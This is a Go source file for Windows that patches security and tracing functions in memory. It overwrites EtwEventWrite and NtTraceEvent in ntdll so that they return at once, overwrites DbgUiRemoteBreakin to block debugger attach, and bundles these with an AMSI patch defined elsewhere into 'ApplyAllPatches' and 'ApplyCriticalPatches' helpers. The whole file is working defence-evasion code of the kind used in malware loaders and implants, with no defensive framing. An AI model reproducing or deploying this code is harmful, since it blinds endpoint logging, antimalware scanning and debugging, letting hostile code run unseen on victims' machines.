//go:build windows

package patches

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

func PatchETW() error {
	handle, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("load ntdll: %w", err)
	}
	defer syscall.FreeLibrary(handle)

	etwEventWriteAddr, err := syscall.GetProcAddress(handle, "EtwEventWrite")
	if err != nil {
		return fmt.Errorf("get EtwEventWrite: %w", err)
	}

	baseAddr := etwEventWriteAddr
	var oldProtect uint32
	regionSize := uintptr(64)
	err = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		syscallwin.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("unprotect EtwEventWrite: %w", err)
	}

	// Patch: XOR EAX, EAX; RET (return 0)
	patch := []byte{0x33, 0xC0, 0xC3}
	var n uintptr
	err = syscallwin.NtWriteVirtualMemory(
		uintptr(0xffffffffffffffff),
		etwEventWriteAddr,
		patch,
		&n,
	)
	if err != nil {
		return fmt.Errorf("patch EtwEventWrite: %w", err)
	}

	var restore uint32
	_ = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		oldProtect,
		&restore,
	)

	_ = syscallwin.NtFlushInstructionCache(
		uintptr(0xffffffffffffffff),
		etwEventWriteAddr,
		64,
	)

	return nil
}

func PatchNtTraceEvent() error {
	handle, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("load ntdll: %w", err)
	}
	defer syscall.FreeLibrary(handle)

	addr, err := syscall.GetProcAddress(handle, "NtTraceEvent")
	if err != nil {
		return fmt.Errorf("get NtTraceEvent: %w", err)
	}

	baseAddr := addr
	var oldProtect uint32
	regionSize := uintptr(64)
	err = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		syscallwin.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("unprotect NtTraceEvent: %w", err)
	}

	patch := []byte{0x33, 0xC0, 0xC3}
	var n uintptr
	err = syscallwin.NtWriteVirtualMemory(
		uintptr(0xffffffffffffffff),
		addr,
		patch,
		&n,
	)
	if err != nil {
		return fmt.Errorf("patch NtTraceEvent: %w", err)
	}

	var restore uint32
	_ = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		oldProtect,
		&restore,
	)

	_ = syscallwin.NtFlushInstructionCache(
		uintptr(0xffffffffffffffff),
		addr,
		64,
	)

	return nil
}

func PatchDbgUiRemoteBreakin() error {
	handle, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("load ntdll: %w", err)
	}
	defer syscall.FreeLibrary(handle)

	addr, err := syscall.GetProcAddress(handle, "DbgUiRemoteBreakin")
	if err != nil {
		return fmt.Errorf("get DbgUiRemoteBreakin: %w", err)
	}

	baseAddr := addr
	var oldProtect uint32
	regionSize := uintptr(64)
	err = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		syscallwin.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("unprotect DbgUiRemoteBreakin: %w", err)
	}

	patch := []byte{0xC3}
	var n uintptr
	err = syscallwin.NtWriteVirtualMemory(
		uintptr(0xffffffffffffffff),
		addr,
		patch,
		&n,
	)
	if err != nil {
		return fmt.Errorf("patch DbgUiRemoteBreakin: %w", err)
	}

	var restore uint32
	_ = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		oldProtect,
		&restore,
	)

	_ = syscallwin.NtFlushInstructionCache(
		uintptr(0xffffffffffffffff),
		addr,
		64,
	)

	return nil
}

func ApplyAllPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	if err := PatchAMSI(); err != nil {
		failed["AMSI"] = err
	} else {
		successful = append(successful, "AMSI")
	}

	if err := PatchETW(); err != nil {
		failed["ETW"] = err
	} else {
		successful = append(successful, "ETW")
	}

	if err := PatchNtTraceEvent(); err != nil {
		failed["NtTraceEvent"] = err
	} else {
		successful = append(successful, "NtTraceEvent")
	}

	if err := PatchDbgUiRemoteBreakin(); err != nil {
		failed["DbgUiRemoteBreakin"] = err
	} else {
		successful = append(successful, "DbgUiRemoteBreakin")
	}

	return
}

func ApplyCriticalPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	if err := PatchAMSI(); err != nil {
		failed["AMSI"] = err
	} else {
		successful = append(successful, "AMSI")
	}

	if err := PatchETW(); err != nil {
		failed["ETW"] = err
	} else {
		successful = append(successful, "ETW")
	}

	return
}
